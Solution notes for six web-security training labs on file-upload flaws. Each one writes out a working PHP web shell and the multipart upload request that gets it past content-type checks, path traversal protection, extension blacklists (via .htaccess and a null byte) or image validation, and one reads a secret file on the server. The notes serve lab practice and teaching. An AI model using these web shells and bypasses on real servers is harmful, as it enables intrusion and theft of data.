## Lab: Remote code execution via web shell upload

This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

```plaintext
Solution:

Just upload a php file with content like
<?php echo system($_GET['command']); ?>

Then access the shell like
/files/avatars/exploit.php?command=ls%20-la%20/home/carlos
```

## Lab: Web shell upload via Content-Type restriction bypass

This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

```plaintext
Solution:

Change the request body to something like this

------WebKitFormBoundaryKlWAOSnhbB7lU8mg
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/jpeg

<?php echo system($_GET['command']); ?>
------WebKitFormBoundaryKlWAOSnhbB7lU8mg
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryKlWAOSnhbB7lU8mg
Content-Disposition: form-data; name="csrf"

bQY1tNXb6Zdb5MWH4pBiBCEO9CZXqryq
------WebKitFormBoundaryKlWAOSnhbB7lU8mg--
```

## Lab: Web shell upload via path traversal

This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

```plaintext
Solution

Upload with path traversal in file name


------WebKitFormBoundaryvAWEtalFLSoqGZtp
Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
Content-Type: image/jpeg

<?php echo system($_GET['command']); ?>
------WebKitFormBoundaryvAWEtalFLSoqGZtp
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryvAWEtalFLSoqGZtp
Content-Disposition: form-data; name="csrf"

y1e7Z0qUuVGBxHXdLHtcIfB6QVlgz1tm
------WebKitFormBoundaryvAWEtalFLSoqGZtp--

```

## Lab: Web shell upload via extension blacklist bypass

This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

```plaintext
Solution:

First, upload an .htaccess file


------WebKitFormBoundary3P9ZpLwFLOopnett
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: application/octet-stream

AddHandler application/x-httpd-php .jpg
------WebKitFormBoundary3P9ZpLwFLOopnett
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundary3P9ZpLwFLOopnett
Content-Disposition: form-data; name="csrf"

vSr8sQW7vNY87nT9pgX7UQsJV3BtHqKC
------WebKitFormBoundary3P9ZpLwFLOopnett--


Then upload and file with the extension defined in .htaccess files uploaded

------WebKitFormBoundaryfbJZpsCq2AlUSOmT
Content-Disposition: form-data; name="avatar"; filename="get_shell.jpg"
Content-Type: application/octet-stream

<?php
// Get the command from the GET parameter
$command = $_GET['command'];

// Execute the command
$output = shell_exec($command);

// Output the result
echo "<pre>$output</pre>";
?>
------WebKitFormBoundaryfbJZpsCq2AlUSOmT
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryfbJZpsCq2AlUSOmT
Content-Disposition: form-data; name="csrf"

vSr8sQW7vNY87nT9pgX7UQsJV3BtHqKC
------WebKitFormBoundaryfbJZpsCq2AlUSOmT--
```

## Lab: Web shell upload via obfuscated file extension

This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

```plaintext
Upload a php file with filename like below


------WebKitFormBoundaryQlFp9f0x9kBK3TgA
Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.jpg"
Content-Type: application/php

<?php
// Get the command from the GET parameter
$command = $_GET['command'];

// Execute the command
$output = shell_exec($command);

// Output the result
echo "<pre>$output</pre>";
?>
------WebKitFormBoundaryQlFp9f0x9kBK3TgA
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryQlFp9f0x9kBK3TgA
Content-Disposition: form-data; name="csrf"

O4172gmebHWewZ4sMvYioGxIH5gPrsdR
------WebKitFormBoundaryQlFp9f0x9kBK3TgA--
```

## Lab: Remote code execution via polyglot web shell upload

This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

```plaintext
Just upload an real image with file extension .php

Then send to Repeater and add a line after the end of file content
<?php echo file_get_contents('/home/carlos/secret'); ?>

Like


------WebKitFormBoundaryvcOVjQrCt9ACxgZ1
Content-Disposition: form-data; name="avatar"; filename="shiba.php"
Content-Type: image/jpeg

ÿØÿà
.....<striped>........

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundaryvcOVjQrCt9ACxgZ1
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryvcOVjQrCt9ACxgZ1
Content-Disposition: form-data; name="csrf"

kUYAxjE0la0ktGV12o31QQF6qb6OdyCv
------WebKitFormBoundaryvcOVjQrCt9ACxgZ1--

```
